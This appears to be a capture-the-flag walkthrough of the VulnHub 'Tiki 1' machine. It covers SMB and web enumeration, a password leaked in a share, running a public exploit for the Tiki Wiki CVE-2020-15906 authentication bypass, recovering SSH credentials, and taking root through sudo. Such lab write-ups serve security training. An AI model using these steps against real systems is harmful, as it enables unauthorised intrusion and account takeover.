# Recon

## NMAP
- tcp/22
- tcp/80
- tcp/139
- tcp/445
- udp/137
- udp/5353

## TCP/139,445 - SMB

###  Enum4linux
```
[*] Users via RPC on 192.168.110.104   
[*] Enumerating users via 'querydispinfo'
[+] Found 1 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 1 users via 'enumdomusers'
[+] After merging user results we have 1 users total:
'1000':
	username: silky
	name: Silky
	acb: '0x00000010'
	description: ''
```
- User `silky`

### Crackmapexec + SMBMap
![](images/Pasted%20image%2020220121224951.png)
- Able to read `Notes` fileshare

## TCP/80
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
robots.txt              [Status: 200, Size: 42, Words: 4, Lines: 4]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
tiki                    [Status: 301, Size: 317, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 6140 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
- `robots.txt`
- `tiki`




# Initial Foothold

## TCP/139,445 - SMB 
1. Earlier, we enumerated SMB Fileshare w/ a NULL session, we have READ access to `Notes` fileshare
2. Download all files in `Notes` fileshare & view its content
	```
	┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb]
	└─# smbclient //$ip/Notes -c 'prompt;recurse;mget *'
	Enter WORKGROUP\root's password: 
	getting file \Mail.txt of size 244 as Mail.txt (14.0 KiloBytes/sec) (average 14.0 KiloBytes/sec)
	┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb]
	└─# ls
	Mail.txt
	┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb]
	└─# cat Mail.txt 
	Hi Silky
	because of a current Breach we had to change all Passwords,
	please note that it was a 0day, we don't know how he made it.

	Your new CMS-password is now 51lky571k1, 
	please investigate how he made it into our Admin Panel.

	Cheers Boss.

	```
## TCP/80 - HTTP
1. Proceed to `/tiki`
	![](images/Pasted%20image%2020220121230715.png)
2. Proceed to `/tiki/tiki-login.php`
	![](images/Pasted%20image%2020220121230848.png)
3. Login w/ silky:`51lky571k1`
	![](images/Pasted%20image%2020220121232020.png)
4. Proceed to `/tiki/tiki-listpages.php`
	![](images/Pasted%20image%2020220121232452.png)
	![](images/Pasted%20image%2020220121232527.png)
5. After looking through the History of Silky homepage, found this
	![](images/Pasted%20image%2020220121232639.png)
	- `CVE-2020-15906`
6. View `CVE-2020-15906` - Tiki 21.1-2
	- https://www.exploit-db.com/exploits/48927
	- https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-15906
		![](images/Pasted%20image%2020220121232946.png)
		- We are able to set admin's password to a blank value after 50 failed login attempts.
7. Search for exploits 
	```
	 ┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb]
	 └─# searchsploit tiki 21
	------------------------------------------------------------------------------------
	Exploit Title                                        |  Path				
	------------------------------------------------------------------------------------
	Tiki Wiki CMS Groupware 21.1 - Authentication Bypass | php/webapps/48927.py
	------------------------------------------------------------------------------------
	```
8. Use exploit
	```
	┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/exploit/tiki-21.1]
	└─# python3 48927.py $ip
	Admin Password got removed.
	Use BurpSuite to login into admin without a password 

	```
9. Login w/ admin:blank w/ Burpsuite
	1. Login w/ admin:test
	2. Intercept w/ burp and remove the password test
		![](images/Pasted%20image%2020220121233907.png)
	3. Turn off intercept
10. Proceed to List Pages -> Credentials
	![](images/Pasted%20image%2020220121235530.png)
	- silky:Agy8Y7SPJNXQzqA

## TCP/22 - SSH
1. SSH w/ silky:Agy8Y7SPJNXQzqA
![](images/Pasted%20image%2020220121235722.png)

# Privilege Escalation

## Root via Sudo
```
silky@ubuntu:~$ sudo -l
[sudo] Passwort für silky: 
Das hat nicht funktioniert, bitte nochmal probieren.
[sudo] Passwort für silky: 
Passende Defaults-Einträge für silky auf ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Der Benutzer silky darf die folgenden Befehle auf ubuntu ausführen:
    (ALL : ALL) ALL
silky@ubuntu:~$ sudo su
root@ubuntu:/home/silky# whoami
root
root@ubuntu:/home/silky# 

```
![](images/Pasted%20image%2020220121235821.png)

---
